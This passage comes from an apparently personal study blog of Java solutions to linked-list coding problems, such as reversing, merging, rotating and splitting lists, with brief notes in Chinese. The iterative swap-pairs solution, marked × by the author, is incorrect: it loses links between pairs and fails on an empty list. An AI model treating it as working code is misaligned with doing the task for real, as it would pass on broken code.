lists.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure><ul><li>循环解法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;    </span><br><span class="line">ListNode head=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    ListNode res = head;</span><br><span class="line">    <span class="keyword">while</span>(l1!=<span class="keyword">null</span>&amp;&amp;l2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(l1.val&lt;=l2.val)&#123;</span><br><span class="line">    head.next=l1;</span><br><span class="line">    l1=l1.next;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    head.next=l2;</span><br><span class="line">    l2=l2.next;</span><br><span class="line">    &#125; </span><br><span class="line">    head=head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    head.next = l1==<span class="keyword">null</span>?l2:l1;</span><br><span class="line">    <span class="keyword">return</span> res.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>递归解法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l1 == <span class="keyword">null</span>) <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span> (l2 == <span class="keyword">null</span>) <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">        l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="445-add-two-numbers-ii">445. Add Two Numbers II —</span></h2><p>You are given two <strong>non-empty</strong> linked lists representing two non-negative integers. The most significant digit comes first and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</p><p>You may assume the two numbers do not contain any leading zero, except the number 0 itself.</p><p><strong>Follow up:</strong><br>What if you cannot modify the input lists? In other words, reversing the lists is not allowed.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; s1 = <span class="keyword">new</span> Stack();</span><br><span class="line">        Stack&lt;Integer&gt; s2 = <span class="keyword">new</span> Stack();</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            s1.push(l1.val);</span><br><span class="line">            l1=l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            s2.push(l2.val);</span><br><span class="line">            l2=l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        ListNode ans = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty()||!s2.isEmpty()||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = s1.isEmpty()?<span class="number">0</span>:s1.pop();</span><br><span class="line">            <span class="keyword">int</span> y = s2.isEmpty()?<span class="number">0</span>:s2.pop();</span><br><span class="line">            <span class="keyword">int</span> sum = x+y+carry;</span><br><span class="line">            ListNode node = <span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            node.next=ans.next;</span><br><span class="line">            ans.next=node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="22-链表中倒数第-k-个结点">22. 链表中倒数第 K 个结点 √</span></h2><p><strong>题目描述</strong> :</p><p>输入一个链表，输出该链表中倒数第k个结点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">FindKthToTail</span><span class="params">(ListNode head,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode fast=head,slow=head;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;k--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="翻转链表">翻转链表</span></h1><h2><span id="206-reverse-linked-list">206. Reverse Linked List √</span></h2><p>Reverse a singly linked list.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure><ul><li>循环解法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode newHead = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ListNode next = head.next;</span><br><span class="line">        head.next = newHead.next;</span><br><span class="line">        newHead.next = head;</span><br><span class="line">        head = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newHead.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>递归解法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode next = head.next;</span><br><span class="line">    ListNode newHead = reverseList(next);</span><br><span class="line">    next.next = head;</span><br><span class="line">    head.next = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> newHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="92-reverse-linked-list-ii">92. Reverse Linked List II √</span></h2><p>Reverse a linked list from position <em>m</em> to <em>n</em>. Do it in one-pass.</p><p><strong>Note:</strong> 1 ≤ <em>m</em> ≤ <em>n</em> ≤ length of list.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m &#x3D; 2, n &#x3D; 4</span><br><span class="line">Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></table></figure><p>自己用了5个指针做出来的</p><p>s代表m位置的指针，e代表n位置的指针。为了防止m从1开始使用了dummy头指针。</p><p>然后root代表s前一个指针，tail代表e后一个指针</p><p>但是胜在好理解，简单粗暴。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseBetween</span><span class="params">(ListNode head, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">       ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       ListNode s=dummy,e=dummy,root=dummy,tail=dummy;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m-<span class="number">1</span>;i++)&#123;</span><br><span class="line">           root=root.next;</span><br><span class="line">       &#125;</span><br><span class="line">       s=root.next;</span><br><span class="line">       e=s;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n-m;i++)&#123;</span><br><span class="line">           e=e.next;</span><br><span class="line">       &#125;</span><br><span class="line">       tail=e.next;</span><br><span class="line">       e.next=<span class="keyword">null</span>;</span><br><span class="line">       ListNode tmp=s;</span><br><span class="line">       reverse(tmp);</span><br><span class="line">       root.next=e;</span><br><span class="line">       s.next=tail;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(ListNode head)</span></span>&#123;</span><br><span class="line">       ListNode root=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           ListNode next=head.next;</span><br><span class="line">           head.next=root.next;</span><br><span class="line">           root.next=head;</span><br><span class="line">           head=next;</span><br><span class="line">       &#125;        </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="25-reverse-nodes-in-k-group">25. Reverse Nodes in k-Group √</span></h2><p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p><p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p><p><strong>Example:</strong></p><p>Given this linked list: <code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p><p>For <em>k</em> = 2, you should return: <code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p><p>For <em>k</em> = 3, you should return: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p><p>只要掌握了reverse这个函数和dummy这个知识点，就能做出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="keyword">int</span> len = count(head,<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">int</span> cnt=len/k;</span><br><span class="line">       ListNode dummy=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       ListNode root=dummy,l1=head,l2=head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k-<span class="number">1</span>;j++)&#123;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;           </span><br><span class="line">           ListNode next=l2.next;</span><br><span class="line">           ListNode tmp=l1;</span><br><span class="line">           l2.next=<span class="keyword">null</span>;</span><br><span class="line">           reverse(tmp);</span><br><span class="line">           l1.next=next;</span><br><span class="line">           root.next=l2;</span><br><span class="line">            root=l1;</span><br><span class="line">           l1=next;</span><br><span class="line">           l2=next;</span><br><span class="line">          </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">(ListNode head,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       <span class="keyword">return</span> count(head.next,res+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(ListNode head)</span></span>&#123;</span><br><span class="line">       ListNode root=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           ListNode next=head.next;</span><br><span class="line">           head.next=root.next;</span><br><span class="line">           root.next=head;</span><br><span class="line">           head=next;</span><br><span class="line">       &#125;   </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="进阶解法">进阶解法</span></h1><h2><span id="24-swap-nodes-in-pairs">24. Swap Nodes in Pairs ×</span></h2><p>Given a linked list, swap every two adjacent nodes and return its head.</p><p>You may <strong>not</strong> modify the values in the list’s nodes, only nodes itself may be changed. </p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure><ul><li><p>循环解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode res = head.next;</span><br><span class="line">    ListNode first=head,second=head.next;</span><br><span class="line">    <span class="keyword">while</span>(first!=<span class="keyword">null</span>&amp;&amp;first.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        ListNode tmp = first.next;</span><br><span class="line">        first.next=first.next.next;</span><br><span class="line">  </span><br><span class="line">        tmp.next=first;</span><br><span class="line">        first=first.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>递归解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>)||(head.next == <span class="keyword">null</span>))</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode n = head.next;</span><br><span class="line">        head.next = swapPairs(head.next.next);</span><br><span class="line">        n.next = head;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="725-split-linked-list-in-parts">725. Split Linked List in Parts —</span></h2><p>题目描述：把链表分隔成 k 部分，每部分的长度都应该尽可能相同，排在前面的长度应该大于等于后面的。</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">root &#x3D; [1, 2, 3], k &#x3D; 5</span><br><span class="line">Output: [[1],[2],[3],[],[]]</span><br><span class="line">Explanation:</span><br><span class="line">The input and each element of the output are ListNodes, not arrays.</span><br><span class="line">For example, the input root has root.val &#x3D; 1, root.next.val &#x3D; 2, root.next.next.val &#x3D; 3, and root.next.next.next &#x3D; null.</span><br><span class="line">The first element output[0] has output[0].val &#x3D; 1, output[0].next &#x3D; null.</span><br><span class="line">The last element output[4] is null, but it&#39;s string representation as a ListNode is [].</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">root &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k &#x3D; 3</span><br><span class="line">Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]]</span><br><span class="line">Explanation:</span><br><span class="line">The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode[] splitListToParts(ListNode root, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        ListNode head=root;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            head=head.next;</span><br><span class="line">            n++;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode[] res = <span class="keyword">new</span> ListNode[k];</span><br><span class="line">        <span class="keyword">int</span> mod = n%k;</span><br><span class="line">        <span class="keyword">int</span> size = n/k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;root!=<span class="keyword">null</span>&amp;&amp;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> cnt = size+(mod--&gt;<span class="number">0</span>?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">            res[i]=root;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;cnt;j++) root=root.next;</span><br><span class="line">            ListNode next = root.next;</span><br><span class="line">            root.next=<span class="keyword">null</span>;</span><br><span class="line">            root=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="328-odd-even-linked-list">328. Odd Even Linked List ×</span></h2><p>Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes.</p><p>You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULL</span><br><span class="line">Output: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">oddEvenList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode odd = head, even = head.next, evenHead = even;</span><br><span class="line">    <span class="keyword">while</span> (even != <span class="keyword">null</span> &amp;&amp; even.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        odd.next = odd.next.next;</span><br><span class="line">        odd = odd.next;</span><br><span class="line">        even.next = even.next.next;</span><br><span class="line">        even = even.next;</span><br><span class="line">    &#125;</span><br><span class="line">    odd.next = evenHead;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="61-rotate-list">61. Rotate List √</span></h2><p>  Given a linked list, rotate the list to the right by <em>k</em> places, where <em>k</em> is non-negative.</p><p>  <strong>Example 1:</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k &#x3D; 2</span><br><span class="line">Output: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br><span class="line">Explanation:</span><br><span class="line">rotate 1 steps to the right: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL</span><br><span class="line">rotate 2 steps to the right: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br></pre></td></tr></table></figure><p>  <strong>Example 2:</strong></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">0</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;NULL, k = <span class="number">4</span></span><br><span class="line">Output: <span class="number">2</span>-&gt;<span class="number">0</span>-&gt;<span class="number">1</span>-&gt;NULL</span><br><span class="line">Explanation:</span><br><span class="line">rotate <span class="number">1</span> steps to the right: <span class="number">2</span>-&gt;<span class="number">0</span>-&gt;<span class="number">1</span>-&gt;NULL</span><br><span class="line">rotate <span class="number">2</span> steps to the right: <span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">0</span>-&gt;NULL</span><br><span class="line">rotate <span class="number">3</span> steps to the right: <span class="number">0</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;NULL</span><br><span class="line">rotate <span class="number">4</span> steps to the right: <span class="number">2</span>-&gt;<span class="number">0</span>-&gt;<span class="number">1</span>-&gt;NULL</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">rotateRight</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="keyword">int</span> len = count(head,<span class="number">0</span>);</span><br><span class="line">       k = k%len; </span><br><span class="line">       <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="keyword">return</span> head;</span><br><span class="line">       ListNode fast=head,slow=head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">           fast=fast.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           fast=fast.next;</span><br><span class="line">           slow=slow.next;</span><br><span class="line">       &#125;</span><br><span class="line">       ListNode res = slow.next;</span><br><span class="line">       slow.next=<span class="keyword">null</span>;</span><br><span class="line">       </span><br><span class="line">       fast.next=head;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">(ListNode head,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> k;</span><br><span class="line">       <span class="keyword">return</span> count(head.next,k+<span class="number">1</span>);</span><br><span class="line">   